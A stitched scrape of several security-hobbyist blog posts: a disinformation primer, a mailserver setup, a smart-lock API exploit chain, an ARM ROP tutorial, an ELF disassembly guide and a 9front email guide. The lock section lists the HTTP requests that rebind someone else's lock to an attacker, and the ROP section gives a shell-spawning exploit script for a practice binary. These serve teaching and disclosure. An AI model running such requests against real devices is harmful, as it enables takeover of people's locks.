Found SUMMARY ['As with the disambiguation of any word, let’s start with its etymology and definiton.\nAccording to Wikipedia,\ndisinformation has been borrowed from the Russian word  —  dezinformatisya (дезинформа́ция),\nderived from the title of a KGB black propaganda department.\n\n\nDisinformation is false information spread deliberately to deceive.\n\n\nTo fully understand disinformation, especially in the modern age, we need to understand the\nkey factors of any successful disinformation operation:\n\n\ncreating disinformation (what)\nthe motivation behind the op, or its end goal (why)\nthe medium used to disperse the falsified information (how)\nthe actor (who)\n\n\nAt the end, we’ll also look at how you can use disinformation techniques to maintain OPSEC.\n\nIn order to break monotony, I will also be using the terms “information operation”, or the shortened\nforms — “info op” & “disinfo”.\n\nCreating disinformation\n\nCrafting or creating disinformation is by no means a trivial task. Often, the quality\nof any disinformation sample is a huge indicator of the level of sophistication of the\nactor involved, i.e. is it a 12 year old troll or a nation state?\n\nWell crafted disinformation always has one primary characteristic  —  “plausibility”.\nThe disinfo must sound reasonable. It must induce the notion it’s likely true.\nTo achieve this, the target  —  be it an individual, a specific demographic or an entire\nnation  —  must be well researched. A deep understanding of the target’s culture, history,\ngeography and psychology is required. It also needs circumstantial and situational awareness,\nof the target.\n\nThere are many forms of disinformation. A few common ones are staged videos / photographs,\nrecontextualized videos / photographs, blog posts, news articles & most recently  —  deepfakes.\n\nHere’s a tweet from the grugq, showing a case of recontextualized\nimagery:\n\n\nDisinformation.\n\nThe content of the photo is not fake. The reality of what it captured is fake. The context it’s placed in is fake. The picture itself is 100% authentic. Everything, except the photo itself, is fake.\nRecontextualisation as threat vector.\npic.twitter.com/Pko3f0xkXC\n&mdash; thaddeus e. grugq (@thegrugq)\nJune 23, 2019\n\n\n\nMotivations behind an information operation\n\nI like to broadly categorize any info op as either proactive or reactive.\nProactively, disinformation is spread with the desire to influence the target\neither before or during the occurence of an event. This is especially observed\nduring elections.1\nIn offensive information operations, the target’s psychological state can be affected by\nspreading fear, uncertainty & doubt, or FUD for short.\n\nReactive disinformation is when the actor, usually a nation state in this case,\nscrews up and wants to cover their tracks. A fitting example of this is the case\nof Malaysian Airlines Flight 17 (MH17), which was shot down while flying over\neastern Ukraine. This tragic incident has been attributed to Russian-backed\nseparatists.2\nRussian media is known to have desseminated a number of alternative & some even\nconspiratorial theories3, in response. The number grew as the JIT’s (Dutch-lead Joint\nInvestigation Team) investigations pointed towards the separatists.\nThe idea was to muddle the information space with these theories, and as a result,\npotentially correct information takes a credibility hit.\n\nAnother motive for an info op is to control the narrative. This is often seen in use\nin totalitarian regimes; when the government decides what the media portrays to the\nmasses. The ongoing Hong Kong protests is a good example.4 According to NPR:\n\n\nOfficial state media pin the blame for protests on the “black hand” of foreign interference,\nnamely from the United States, and what they have called criminal Hong Kong thugs.\nA popular conspiracy theory posits the CIA incited and funded the Hong Kong protesters,\nwho are demanding an end to an extradition bill with China and the ability to elect their own leader.\nFueling this theory, China Daily, a state newspaper geared toward a younger, more cosmopolitan audience,\nthis week linked to a video purportedly showing Hong Kong protesters using American-made grenade launchers to combat police.\n…\n\n\nMedia used to disperse disinfo\n\nAs seen in the above example of totalitarian governments, national TV and newspaper agencies\nplay a key role in influence ops en masse. It guarantees outreach due to the channel/paper’s\npopularity.\n\nTwitter is another, obvious example. Due to the ease of creating accounts and the ability to\ngenerate activity programmatically via the API, Twitter bots are the go-to choice today for\ninfo ops. Essentially, an actor attempts to create “discussions” amongst “users” (read: bots),\nto push their narrative(s). Twitter also provides analytics for every tweet, enabling actors to\nget realtime insights into what sticks and what doesn’t.\nThe use of Twitter was seen during the previously discussed MH17 case, where Russia employed its troll\nfactory  —  the Internet Research Agency (IRA)\nto create discussions about alternative theories.\n\nIn India, disinformation is often spread via YouTube, WhatsApp and Facebook. Political parties\nactively invest in creating group chats to spread political messages and memes. These parties\nhave volunteers whose sole job is to sit and forward messages.\nApart from political propaganda, WhatsApp finds itself as a medium of fake news. In most cases,\nthis is disinformation without a motive, or the motive is hard to determine simply because\nthe source is impossible to trace, lost in forwards.5\nThis is a difficult problem to combat, especially given the nature of the target audience.\n\nThe actors behind disinfo campaigns\n\nI doubt this requires further elaboration, but in short:\n\n\nnation states and their intelligence agencies\ngovernments, political parties\nother non/quasi-governmental groups\ntrolls\n\n\nThis essentially sums up the what, why, how and who of disinformation.\n\nPersonal OPSEC\n\nThis is a fun one. Now, it’s common knowledge that\nSTFU is the best policy. But sometimes, this might not be possible, because\nafterall inactivity leads to suspicion, and suspicion leads to scrutiny. Which might\nlead to your OPSEC being compromised.\nSo if you really have to, you can feign activity using disinformation. For example,\npick a place, and throw in subtle details pertaining to the weather, local events\nor regional politics of that place into your disinfo. Assuming this is Twitter, you can\ntweet stuff like:\n\n\n“Ugh, when will this hot streak end?!”\n“Traffic wonky because of the Mardi Gras parade.”\n“Woah, XYZ place is nice! Especially the fountains by ABC street.”\n\n\nOf course, if you’re a nobody on Twitter (like me), this is a non-issue for you.\n\nAnd please, don’t do this:\n\n\n\nConclusion\n\nThe ability to influence someone’s decisions/thought process in just one tweet is\nscary. There is no simple way to combat disinformation. Social media is hard to control.\nJust like anything else in cyber, this too is an endless battle between social media corps\nand motivated actors.\n\nA huge shoutout to Bellingcat for their extensive research in this field, and for helping\nfolks see the truth in a post-truth world.\n\n\n\n\n\n\nThis episode of CYBER talks about election influence ops (features the grugq!).\n\nThe Bellingcat Podcast’s season one covers the MH17 investigation in detail.\n\nWikipedia section on MH17 conspiracy theories\n\nChinese newspaper spreading disinfo\n\nUse an adblocker before clicking this.\n\n\n\n'] at ['https://icyphox.sh/blog/disinfo']

Found SUMMARY ['A mailserver was a long time coming. I’d made an attempt at setting one up\naround ~4 years ago (ish), and IIRC, I quit when it came to DNS. And\nI almost did this time too.1\n\nFor this attempt, I wanted a simpler approach. I recall how terribly\nconfusing Dovecot & Postfix were to configure and hence I decided to look\nfor a containerized solution, that most importantly, runs on my cheap $5\nDigital Ocean VPS  —  1 vCPU and 1 GB memory. Of which only around 500 MB\nis actually available. So yeah, pretty tight.\n\nWhat’s available\n\nTurns out, there are quite a few of these OOTB, ready to deply solutions.\nThese are the ones I came across:\n\n\nposte.io: Based on an “open core” model. The base install is open source\nand free (as in beer), but you’ll have to pay for the extra stuff.\n\nmailu.io: Free software. Draws inspiration from poste.io,\nbut ships with a web UI that I didn’t need.\n\nmailcow.email: These fancy domains are getting ridiculous. But more importantly\nthey need 2 GiB of RAM plus swap?! Nope.\n\nMail-in-a-Box: Unlike the ones above, not a Docker-based solution but definitely worth\na mention. It however, needs a fresh box to work with. A box with absolutely\nnothing else on it. I can’t afford to do that.\n\ndocker-mailserver: The winner.\n\n\nSo… docker-mailserver\n\nThe first thing that caught my eye in the README:\n\n\nRecommended:\n\n\n1 CPU\n1GB RAM\n\n\nMinimum:\n\n\n1 CPU\n512MB RAM\n\n\n\nFantastic, I can somehow squeeze this into my existing VPS.\nSetup was fairly simple & the docs are pretty good. It employs a single\n.env file for configuration, which is great.\nHowever, I did run into a couple of hiccups here and there.\n\nOne especially nasty one was docker / docker-compose running out\nof memory.\nError response from daemon: cannot stop container: 2377e5c0b456: Cannot kill container 2377e5c0b456226ecaa66a5ac18071fc5885b8a9912feeefb07593638b9a40d1: OCI runtime state failed: runc did not terminate sucessfully: fatal error: runtime: out of memory\n\nBut it eventually worked after a couple of attempts.\n\nThe next thing I struggled with  —  DNS. Specifically, the with the step where\nthe DKIM keys are generated2. The output under\nconfig/opendkim/keys/domain.tld/mail.txt\nisn’t exactly CloudFlare friendly; they can’t be directly copy-pasted into\na TXT record.\n\nThis is what it looks like.\nmail._domainkey\tIN\tTXT\t( "v=DKIM1; h=sha256; k=rsa; "\n\t  "p=<key>"\n\t  "<more key>" )  ;  -- -- DKIM key mail for icyphox.sh\n\nBut while configuring the record, you set “Type” to TXT, “Name” to mail._domainkey,\nand the “Value” to what’s inside the parenthesis (  ), removing the quotes "".\nAlso remove the part that appears to be a comment ;  -- -- ....\n\nTo simplify debugging DNS issues later, it’s probably a good idea to\npoint to your mailserver using a subdomain like mail.domain.tld using an\nA record.\nYou’ll then have to set an MX record with the “Name” as @ (or whatever your DNS provider\nuses to denote the root domain) and the “Value” to mail.domain.tld.\nAnd finally, the PTR (pointer record, I think), which is the reverse of\nyour A record  —  “Name” as the server IP and “Value” as mail.domain.tld.\nI learnt this part the hard way, when my outgoing email kept getting\nrejected by Tutanota’s servers.\n\nYet another hurdle  —  SSL/TLS certificates. This isn’t very properly\ndocumented, unless you read through the wiki\nand look at an example. In short, install certbot, have port 80 free,\nand run\n$ certbot certonly --standalone -d mail.domain.tld\n\nOnce that’s done, edit the docker-compose.yml file to mount /etc/letsencrypt in\nthe container, something like so:\n...\n\nvolumes:\n    - maildata:/var/mail\n    - mailstate:/var/mail-state\n    - ./config/:/tmp/docker-mailserver/\n    - /etc/letsencrypt:/etc/letsencrypt\n\n...\n\nWith this done, you shouldn’t have mail clients complaining about\nwonky certs for which you’ll have to add an exception manually.\n\nWhy would you…?\n\nThere are a few good reasons for this:\n\nPrivacy\n\nNo really, this is the best choice for truly private\nemail. Not ProtonMail, not Tutanota. Sure, they claim so and I don’t\ndispute it. Quoting Drew Devault3,\n\n\nTruly secure systems do not require you to trust the service provider.\n\n\nBut you have to trust ProtonMail. They run open source software, but\nhow can you really be sure that it isn’t a backdoored version of it?\n\nWhen you host your own mailserver, you truly own your email without having to rely on any\nthird-party.\nThis isn’t an attempt to spread FUD. In the end, it all depends on your\nthreat model™.\n\nDecentralization\n\nEmail today is basically run by Google. Gmail has over 1.2 billion\nactive users. That’s obscene.\nEmail was designed to be decentralized but big corps swooped in and\nmade it a product. They now control your data, and it isn’t unknown that\nGoogle reads your mail. This again loops back to my previous point, privacy.\nDecentralization guarantees privacy. When you control your mail, you subsequently\ncontrol who reads it.\n\nPersonalization\n\nCan’t ignore this one. It’s cool to have a custom email address to flex.\n\nx@icyphox.sh vs gabe.newell4321@gmail.com\n\nPfft, this is no competition.\n\n\n\n\n\n\nMy tweet of frustration.\n\nLink to step in the docs.\n\nFrom his article on why he doesn’t trust Signal.\n\n\n\n'] at ['https://icyphox.sh/blog/mailserver']

Why bother when there exists an\neasier approach — BurpSuite.\n\nWe captured and played around with a bunch of requests and responses,\nand finally arrived at a working exploit chain.\n\nThe exploit\n\nThe entire exploit is a 4 step process consisting of authenticated\nHTTP requests:\n\n\nUsing the lock’s MAC (obtained via a simple Bluetooth scan in the\nvicinity), get the barcode and lock ID\nUsing the barcode, fetch the user ID\nUsing the lock ID and user ID, unbind the user from the lock\nProvide a new name, attacker’s user ID and the MAC to bind the attacker\nto the lock\n\n\nThis is what it looks like, in essence (personal info redacted).\n\nRequest 1\nPOST /oklock/lock/queryDevice\n{"mac":"XX:XX:XX:XX:XX:XX"}\n\nResponse:\n{\n   "result":{\n      "alarm":0,\n      "barcode":"<BARCODE>",\n      "chipType":"1",\n      "createAt":"2019-05-14 09:32:23.0",\n      "deviceId":"",\n      "electricity":"95",\n      "firmwareVersion":"2.3",\n      "gsmVersion":"",\n      "id":<LOCK ID>,\n      "isLock":0,\n      "lockKey":"69,59,58,0,26,6,67,90,73,46,20,84,31,82,42,95",\n      "lockPwd":"000000",\n      "mac":"XX:XX:XX:XX:XX:XX",\n      "name":"lock",\n      "radioName":"BlueFPL",\n      "type":0\n   },\n   "status":"2000"\n}\n\nRequest 2\nPOST /oklock/lock/getDeviceInfo\n\n{"barcode":"https://app.oklok.com.cn/app.html?id=<BARCODE>"}\n\nResponse:\n   "result":{\n      "account":"email@some.website",\n      "alarm":0,\n      "barcode":"<BARCODE>",\n      "chipType":"1",\n      "createAt":"2019-05-14 09:32:23.0",\n      "deviceId":"",\n      "electricity":"95",\n      "firmwareVersion":"2.3",\n      "gsmVersion":"",\n      "id":<LOCK ID>,\n      "isLock":0,\n      "lockKey":"69,59,58,0,26,6,67,90,73,46,20,84,31,82,42,95",\n      "lockPwd":"000000",\n      "mac":"XX:XX:XX:XX:XX:XX",\n      "name":"lock",\n      "radioName":"BlueFPL",\n      "type":0,\n      "userId":<USER ID>\n   }\n\nRequest 3\nPOST /oklock/lock/unbind\n\n{"lockId":"<LOCK ID>","userId":<USER ID>}\n\nRequest 4\nPOST /oklock/lock/bind\n\n{"name":"newname","userId":<USER ID>,"mac":"XX:XX:XX:XX:XX:XX"}\n\nThat’s it!

Found SUMMARY ['Before we start anything, you’re expected to know the basics of ARM\nassembly to follow along. I highly recommend\nAzeria’s series on ARM Assembly\nBasics. Once you’re\ncomfortable with it, proceed with the next bit — environment setup.\n\nSetup\n\nSince we’re working with the ARM architecture, there are two options to go\nforth with:\n\n\nEmulate — head over to qemu.org/download and install QEMU.\nAnd then download and extract the ARMv6 Debian Stretch image from one of the links here.\nThe scripts found inside should be self-explanatory.\nUse actual ARM hardware, like an RPi.\n\n\nFor debugging and disassembling, we’ll be using plain old gdb, but you\nmay use radare2, IDA or anything else, really. All of which can be\ntrivially installed.\n\nAnd for the sake of simplicity, disable ASLR:\n$ echo 0 > /proc/sys/kernel/randomize_va_space\n\nFinally, the binary we’ll be using in this exercise is Billy Ellis’\nroplevel2.\n\nCompile it:\n$ gcc roplevel2.c -o rop2\n\nWith that out of the way, here’s a quick run down of what ROP actually is.\n\nA primer on ROP\n\nROP or Return Oriented Programming is a modern exploitation technique that’s\nused to bypass protections like the NX bit (no-execute bit) and code sigining.\nIn essence, no code in the binary is actually modified and the entire exploit\nis crafted out of pre-existing artifacts within the binary, known as gadgets.\n\nA gadget is essentially a small sequence of code (instructions), ending with\na ret, or a return instruction. In our case, since we’re dealing with ARM\ncode, there is no ret instruction but rather a pop {pc} or a bx lr.\nThese gadgets are chained together by jumping (returning) from one onto the other\nto form what’s called as a ropchain. At the end of a ropchain,\nthere’s generally a call to system(), to acheive code execution.\n\nIn practice, the process of executing a ropchain is something like this:\n\n\nconfirm the existence of a stack-based buffer overflow\nidentify the offset at which the instruction pointer gets overwritten\nlocate the addresses of the gadgets you wish to use\ncraft your input keeping in mind the stack’s layout, and chain the addresses\nof your gadgets\n\n\nLiveOverflow has a beautiful video where he explains ROP using “weird machines”.\nCheck it out, it might be just what you needed for that “aha!” moment :)\n\nStill don’t get it? Don’t fret, we’ll look at actual exploit code in a bit and hopefully\nthat should put things into perspective.\n\nExploring our binary\n\nStart by running it, and entering any arbitrary string. On entering a fairly\nlarge string, say, “A” × 20, we\nsee a segmentation fault occur.\n\n\n\nNow, open it up in gdb and look at the functions inside it.\n\n\n\nThere are three functions that are of importance here, main, winner and\ngadget. Disassembling the main function:\n\n\n\nWe see a buffer of 16 bytes being created (sub\tsp, sp, #16), and some calls\nto puts()/printf() and scanf(). Looks like winner and gadget are\nnever actually called.\n\nDisassembling the gadget function:\n\n\n\nThis is fairly simple, the stack is being initialized by pushing {r11},\nwhich is also the frame pointer (fp). What’s interesting is the pop {r0, pc}\ninstruction in the middle. This is a gadget.\n\nWe can use this to control what goes into r0 and pc. Unlike in x86 where\narguments to functions are passed on the stack, in ARM the registers r0 to r3\nare used for this. So this gadget effectively allows us to pass arguments to\nfunctions using r0, and subsequently jumping to them by passing its address\nin pc. Neat.\n\nMoving on to the disassembly of the winner function:\n\n\n\nHere, we see a calls to puts(), system() and finally, exit().\nSo our end goal here is to, quite obviously, execute code via the system()\nfunction.\n\nNow that we have an overview of what’s in the binary, let’s formulate a method\nof exploitation by messing around with inputs.\n\nMessing around with inputs :^)\n\nBack to gdb, hit r to run and pass in a patterned input, like in the\nscreenshot.\n\n\n\nWe hit a segfault because of invalid memory at address 0x46464646. Notice\nthe pc has been overwritten with our input.\nSo we smashed the stack alright, but more importantly, it’s at the letter ‘F’.\n\nSince we know the offset at which the pc gets overwritten, we can now\ncontrol program execution flow. Let’s try jumping to the winner function.\n\nDisassemble winner again using disas winner and note down the offset\nof the second instruction — add r11, sp, #4.\nFor this, we’ll use Python to print our input string replacing FFFF with\nthe address of winner. Note the endianness.\n$ python -c 'print("AAAABBBBCCCCDDDDEEEE\\x28\\x05\\x01\\x00")' | ./rop2\n\n\n\nThe reason we don’t jump to the first instruction is because we want to control the stack\nourselves. If we allow push {rll, lr} (first instruction) to occur, the program will pop\nthose out after winner is done executing and we will no longer control\nwhere it jumps to.\n\nSo that didn’t do much, just prints out a string “Nothing much here…”.\nBut it does however, contain system(). Which somehow needs to be populated with an argument\nto do what we want (run a command, execute a shell, etc.).\n\nTo do that, we’ll follow a multi-step process:\n\n\nJump to the address of gadget, again the 2nd instruction. This will pop r0 and pc.\nPush our command to be executed, say “/bin/sh” onto the stack. This will go into\nr0.\nThen, push the address of system(). And this will go into pc.\n\n\nThe pseudo-code is something like this:\nstring = AAAABBBBCCCCDDDDEEEE\ngadget = # addr of gadget\nbinsh  = # addr of /bin/sh\nsystem = # addr of system()\n\nprint(string + gadget + binsh + system)\n\nClean and mean.\n\nThe exploit\n\nTo write the exploit, we’ll use Python and the absolute godsend of a library — struct.\nIt allows us to pack the bytes of addresses to the endianness of our choice.\nIt probably does a lot more, but who cares.\n\nLet’s start by fetching the address of /bin/sh. In gdb, set a breakpoint\nat main, hit r to run, and search the entire address space for the string “/bin/sh”:\n(gdb) find &system, +9999999, "/bin/sh"\n\n\n\nOne hit at 0xb6f85588. The addresses of gadget and system() can be\nfound from the disassmblies from earlier. Here’s the final exploit code:\nimport struct\n\nbinsh = struct.pack("I", 0xb6f85588)\nstring = "AAAABBBBCCCCDDDDEEEE"\ngadget = struct.pack("I", 0x00010550)\nsystem = struct.pack("I", 0x00010538)\n\nprint(string + gadget + binsh + system)\n\n\nHonestly, not too far off from our pseudo-code :)\n\nLet’s see it in action:\n\n\n\nNotice that it doesn’t work the first time, and this is because /bin/sh terminates\nwhen the pipe closes, since there’s no input coming in from STDIN.\nTo get around this, we use cat(1) which allows us to relay input through it\nto the shell. Nifty trick.\n\nConclusion\n\nThis was a fairly basic challenge, with everything laid out conveniently.\nActual ropchaining is a little more involved, with a lot more gadgets to be chained\nto acheive code execution.\n\nHopefully, I’ll get around to writing about heap exploitation on ARM too. That’s all for now.\n'] at ['https://icyphox.sh/blog/rop-on-arm']

Found SUMMARY ['While solving complex reversing challenges, we often use established tools like radare2 or IDA for disassembling and debugging. But there are times when you need to dig in a little deeper and understand how things work under the hood.\n\nRolling your own disassembly scripts can be immensely helpful when it comes to automating certain processes, and eventually build your own homebrew reversing toolchain of sorts. At least, that’s what I’m attempting anyway.\n\nSetup\n\nAs the title suggests, you’re going to need a Python 3 interpreter before\nanything else. Once you’ve confirmed beyond reasonable doubt that you do,\nin fact, have a Python 3 interpreter installed on your system, run\n$ pip install capstone pyelftools\n\nwhere capstone is the disassembly engine we’ll be scripting with and pyelftools to help parse ELF files.\n\nWith that out of the way, let’s start with an example of a basic reversing\nchallenge.\n/* chall.c */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main() {\n   char *pw = malloc(9);\n   pw[0] = 'a';\n   for(int i = 1; i <= 8; i++){\n       pw[i] = pw[i - 1] + 1;\n   }\n   pw[9] = '\\0';\n   char *in = malloc(10);\n   printf("password: ");\n   fgets(in, 10, stdin);        // 'abcdefghi'\n   if(strcmp(in, pw) == 0) {\n       printf("haha yes!\\n");\n   }\n   else {\n       printf("nah dude\\n");\n   }\n}\n\nCompile it with GCC/Clang:\n$ gcc chall.c -o chall.elf\n\nScripting\n\nFor starters, let’s look at the different sections present in the binary.\n# sections.py\n\nfrom elftools.elf.elffile import ELFFile\n\nwith open('./chall.elf', 'rb') as f:\n    e = ELFFile(f)\n    for section in e.iter_sections():\n        print(hex(section['sh_addr']), section.name)\n\nThis script iterates through all the sections and also shows us where it’s loaded. This will be pretty useful later. Running it gives us\n› python sections.py\n0x238\xa0.interp\n0x254\xa0.note.ABI-tag\n0x274\xa0.note.gnu.build-id\n0x298\xa0.gnu.hash\n0x2c0\xa0.dynsym\n0x3e0\xa0.dynstr\n0x484\xa0.gnu.version\n0x4a0\xa0.gnu.version_r\n0x4c0\xa0.rela.dyn\n0x598\xa0.rela.plt\n0x610\xa0.init\n0x630\xa0.plt\n0x690\xa0.plt.got\n0x6a0\xa0.text\n0x8f4\xa0.fini\n0x900\xa0.rodata\n0x924\xa0.eh_frame_hdr\n0x960\xa0.eh_frame\n0x200d98\xa0.init_array\n0x200da0\xa0.fini_array\n0x200da8\xa0.dynamic\n0x200f98\xa0.got\n0x201000\xa0.data\n0x201010\xa0.bss\n0x0\xa0.comment\n0x0\xa0.symtab\n0x0\xa0.strtab\n0x0\xa0.shstrtab\n\nMost of these aren’t relevant to us, but a few sections here are to be noted. The .text section contains the instructions (opcodes) that we’re after. The .data section should have strings and constants initialized at compile time. Finally, the .plt which is the Procedure Linkage Table and the .got, the Global Offset Table. If you’re unsure about what these mean, read up on the ELF format and its internals.\n\nSince we know that the\xa0.text section has the opcodes, let’s disassemble the binary starting at that address.\n# disas1.py\n\nfrom elftools.elf.elffile import ELFFile\nfrom capstone import *\n\nwith open('./bin.elf', 'rb') as f:\n    elf = ELFFile(f)\n    code = elf.get_section_by_name('.text')\n    ops = code.data()\n    addr = code['sh_addr']\n    md = Cs(CS_ARCH_X86, CS_MODE_64)\n    for i in md.disasm(ops, addr):        \n        print(f'0x{i.address:x}:\\t{i.mnemonic}\\t{i.op_str}')\n\nThe code is fairly straightforward (I think). We should be seeing this, on running\n› python disas1.py | less      \n0x6a0: xor ebp, ebp\n0x6a2: mov r9, rdx\n0x6a5: pop rsi\n0x6a6: mov rdx, rsp\n0x6a9: and rsp, 0xfffffffffffffff0\n0x6ad: push rax\n0x6ae: push rsp\n0x6af: lea r8, [rip + 0x23a]\n0x6b6: lea rcx, [rip + 0x1c3]\n0x6bd: lea rdi, [rip + 0xe6]\n**0x6c4: call qword ptr [rip + 0x200916]**\n0x6ca: hlt\n... snip ...\n\nThe line in bold is fairly interesting to us. The address at [rip + 0x200916] is equivalent to [0x6ca + 0x200916], which in turn evaluates to 0x200fe0. The first call being made to a function at 0x200fe0? What could this function be?\n\nFor this, we will have to look at relocations. Quoting linuxbase.org\n\n\nRelocation is the process of connecting symbolic references with symbolic definitions. For example, when a program calls a function, the associated call instruction must transfer control to the proper destination address at execution. Relocatable files must have “relocation entries’’ which are necessary because they contain information that describes how to modify their section contents, thus allowing executable and shared object files to hold the right information for a process’s program image.\n\n\nTo try and find these relocation entries, we write a third script.\n# relocations.py\n\nimport sys\nfrom elftools.elf.elffile import ELFFile\nfrom elftools.elf.relocation import RelocationSection\n\nwith open('./chall.elf', 'rb') as f:\n    e = ELFFile(f)\n    for section in e.iter_sections():\n        if isinstance(section, RelocationSection):\n            print(f'{section.name}:')\n            symbol_table = e.get_section(section['sh_link'])\n            for relocation in section.iter_relocations():\n                symbol = symbol_table.get_symbol(relocation['r_info_sym'])\n                addr = hex(relocation['r_offset'])\n                print(f'{symbol.name} {addr}')\n\nLet’s run through this code real quick. We first loop through the sections, and check if it’s of the type RelocationSection. We then iterate through the relocations from the symbol table for each section. Finally, running this gives us\n› python relocations.py\n.rela.dyn:\n 0x200d98\n 0x200da0\n 0x201008\n_ITM_deregisterTMCloneTable 0x200fd8\n**__libc_start_main 0x200fe0**\n__gmon_start__ 0x200fe8\n_ITM_registerTMCloneTable 0x200ff0\n__cxa_finalize 0x200ff8\nstdin 0x201010\n.rela.plt:\nputs 0x200fb0\nprintf 0x200fb8\nfgets 0x200fc0\nstrcmp 0x200fc8\nmalloc 0x200fd0\n\nRemember the function call at 0x200fe0 from earlier? Yep, so that was a call to the well known __libc_start_main. Again, according to linuxbase.org\n\n\nThe __libc_start_main() function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function.\n\n\nAnd its definition is like so\nint __libc_start_main(int *(main) (int, char * *, char * *), \nint argc, char * * ubp_av, \nvoid (*init) (void), \nvoid (*fini) (void), \nvoid (*rtld_fini) (void), \nvoid (* stack_end));\n\nLooking back at our disassembly\n0x6a0: xor ebp, ebp\n0x6a2: mov r9, rdx\n0x6a5: pop rsi\n0x6a6: mov rdx, rsp\n0x6a9: and rsp, 0xfffffffffffffff0\n0x6ad: push rax\n0x6ae: push rsp\n0x6af: lea r8, [rip + 0x23a]\n0x6b6: lea rcx, [rip + 0x1c3]\n**0x6bd: lea rdi, [rip + 0xe6]**\n0x6c4: call qword ptr [rip + 0x200916]\n0x6ca: hlt\n... snip ...\n\nbut this time, at the lea or Load Effective Address instruction, which loads some address [rip + 0xe6] into the rdi register. [rip + 0xe6] evaluates to 0x7aa which happens to be the address of our main() function! How do I know that? Because __libc_start_main(), after doing whatever it does, eventually jumps to the function at rdi, which is generally the main() function. It looks something like this\n\n\n\nTo see the disassembly of main, seek to 0x7aa in the output of the script we’d written earlier (disas1.py).\n\nFrom what we discovered earlier, each call instruction points to some function which we can see from the relocation entries. So following each call into their relocations gives us this\nprintf 0x650\nfgets  0x660\nstrcmp 0x670\nmalloc 0x680\n\nPutting all this together, things start falling into place. Let me highlight the key sections of the disassembly here. It’s pretty self-explanatory.\n0x7b2: mov edi, 0xa  ; 10\n0x7b7: call 0x680    ; malloc\n\nThe loop to populate the *pw string\n0x7d0:  mov     eax, dword ptr [rbp - 0x14]\n0x7d3:  cdqe    \n0x7d5:  lea     rdx, [rax - 1]\n0x7d9:  mov     rax, qword ptr [rbp - 0x10]\n0x7dd:  add     rax, rdx\n0x7e0:  movzx   eax, byte ptr [rax]\n0x7e3:  lea     ecx, [rax + 1]\n0x7e6:  mov     eax, dword ptr [rbp - 0x14]\n0x7e9:  movsxd  rdx, eax\n0x7ec:  mov     rax, qword ptr [rbp - 0x10]\n0x7f0:  add     rax, rdx\n0x7f3:  mov     edx, ecx\n0x7f5:  mov     byte ptr [rax], dl\n0x7f7:  add     dword ptr [rbp - 0x14], 1\n0x7fb:  cmp     dword ptr [rbp - 0x14], 8\n0x7ff:  jle     0x7d0\n\nAnd this looks like our strcmp()\n0x843:  mov     rdx, qword ptr [rbp - 0x10] ; *in\n0x847:  mov     rax, qword ptr [rbp - 8]    ; *pw\n0x84b:  mov     rsi, rdx             \n0x84e:  mov     rdi, rax\n0x851:  call    0x670                       ; strcmp  \n0x856:  test    eax, eax                    ; is = 0? \n0x858:  jne     0x868                       ; no? jump to 0x868\n0x85a:  lea     rdi, [rip + 0xae]           ; "haha yes!" \n0x861:  call    0x640                       ; puts\n0x866:  jmp     0x874\n0x868:  lea     rdi, [rip + 0xaa]           ; "nah dude"\n0x86f:  call    0x640                       ; puts  \n\nI’m not sure why it uses puts here? I might be missing something; perhaps printf calls puts. I could be wrong. I also confirmed with radare2 that those locations are actually the strings “haha yes!” and “nah dude”.\n\nUpdate: It’s because of compiler optimization. A printf() (in this case) is seen as a bit overkill, and hence gets simplified to a puts().\n\nConclusion\n\nWew, that took quite some time. But we’re done. If you’re a beginner, you might find this extremely confusing, or probably didn’t even understand what was going on. And that’s okay. Building an intuition for reading and grokking disassembly comes with practice. I’m no good at it either.\n\nAll the code used in this post is here: https://github.com/icyphox/asdf/tree/master/reversing-elf\n\nCiao for now, and I’ll see ya in #2 of this series — PE binaries.

EXCEPT DESCRIPTION FOUND: ['\nMore general guides about 9front can be found by visiting the 9guide host. You might be interested in my upas guide.\n\nI began to use Fastmail during fall 2020. At first, I only used one account there, but I liked it so much that I migrated accounts I hosted at Migadu there. Don’t get me wrong, I liked Migadu and I still think that it is a fine service if you receive more emails than you send. I’m receiving almost as many emails as I send, so my main email address was self-hosted on Oyabun. The whole setup was messy, and I was not happy with it. So, I migrated everything to Fastmail. The nice side effect was that it made email setup on 9front simple.\n\nA Single Account\nSince I migrated my accounts to Fastmail, I only have a single account to check. Aliases and identities are well handled by the service. With a single command, I can open a unified mailbox like my Inbox. This is the command that I have in $HOME/lib/profile.\n\n\nupas/fs -f /imaps/imap.fastmail.com/roy@royniang.com\nN.B. You can issue this command for any mailbox like explained here.\n\n\nWhere the setup really shines, though, is for sending emails. Sending emails from multiple accounts typically relies on a clunky script to determine the sending account.\n\n\n#!/bin/rc\nshift\nsmtp=tcp!smtp.fastmail.com!565\nshift\ndom=fastmail.com\nexec /bin/upas/smtp -tu roy@royniang.com -d -a -h $dom $smtp $*\nfig. Content of /mail/lib/remotemail.\n\n\nNow, I just have to worry about the identity of the sender. marhsal(1) normally handle this with using the environment variable $upasname. But it is temporary and linked to a text window. A solution is to add header values to /mail/box/user/headers. The values set there will stay between sessions and text windows. I created a script to swap the From: value on the fly.\n\n\n#!/bin/rc\n\nswitch($1) {\ncase rn\n\techo \'From: roy niang <roy@royniang.com>\' > /mail/box/royniang/headers\ncase rs\n\techo \'From: something else <rs@something.info>\' > /mail/box/royniang/headers\ncase w\n\techo \'From: who knows <w@who.who>\' > /mail/box/royniang/headers\ncase *\n\techo No.\n}\n\ncat /mail/box/royniang/headers\nfig. Content of $HOME/bin/rc/fml. Note that the content of the headers file is displayed in any case.\n\n\n\nFastmail Configuration\nThere is a small annoyance with how emails are handled. When you send an email, It’s not saved in your “Sent” mailbox. This is a normal behaviour, but we are in the 21st century. You can play with upas’ filters, but Fastmail have a setting to fix this problem.\nFrom the webmail interface navigate to Settings, Sending Identities, and select your identity. In the advanced preferences, check the box for “Save a copy when sending through third party email clients”, and you are set.\nYou’ll notice on the remotemail script that the SMTP port is configured on the non-standard port 565. This is a small goodie that Fastmail created. When you send an email from their webmail, your IP address is stripped out of the headers, but not with a third-party client. If you use the port 565 to send your email, it will replicate this behaviour. I wonder why they didn’t add this feature with standard ports.\n\n  '] at ['https://royniang.com/fastmail_and_9front.html']

